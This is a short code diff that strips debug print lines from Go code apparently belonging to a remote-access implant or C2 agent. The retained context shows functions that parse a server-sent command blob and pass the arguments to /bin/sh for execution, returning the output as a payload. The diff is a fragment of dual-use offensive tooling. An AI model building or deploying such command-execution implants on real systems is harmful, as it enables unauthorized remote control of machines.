@@ -9,7 +9,6 @@ import (
 
 // HandleComs will take the commandstring blob and execute them all, then return the results encoded into a payload
 func HandleComs(comstr string, m Metclient) string {
-	fmt.Println("in handlecoms")
 	comResults := parseCommands(comstr)
 	respayload := genResPL(comResults, m)
 	return respayload
@@ -17,11 +16,9 @@ func HandleComs(comstr string, m Metclient) string {
 
 //split large string into individual commands/arguments
 func parseCommands(commandBlob string) []string {
-	fmt.Println("in parsecommands")
 	results := []string{}
 	isplit := strings.Split(commandBlob, "<||>")
 	for _, comStr := range isplit {
-		fmt.Println("loopcomstr: " + comStr)
 		jsplit := strings.SplitN(comStr, ":", 3)
 		aid := jsplit[0]
 		mode := jsplit[1]
@@ -38,7 +35,6 @@ func parseCommands(commandBlob string) []string {
 
 //pass each action to appropriate handler
 func execCommand(mode string, args string) string {
-	fmt.Println("In execCommand: " + mode + " " + args)
 	retval := ""
 	switch mode {
 	case "0": //no command
@@ -75,7 +71,6 @@ func execCommand(mode string, args string) string {
 
 //most commonly used, pass in args to a shell
 func shellExec(args string) string {
-	fmt.Println(args)
 	cmd := exec.Command("/bin/sh", "-c", args)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
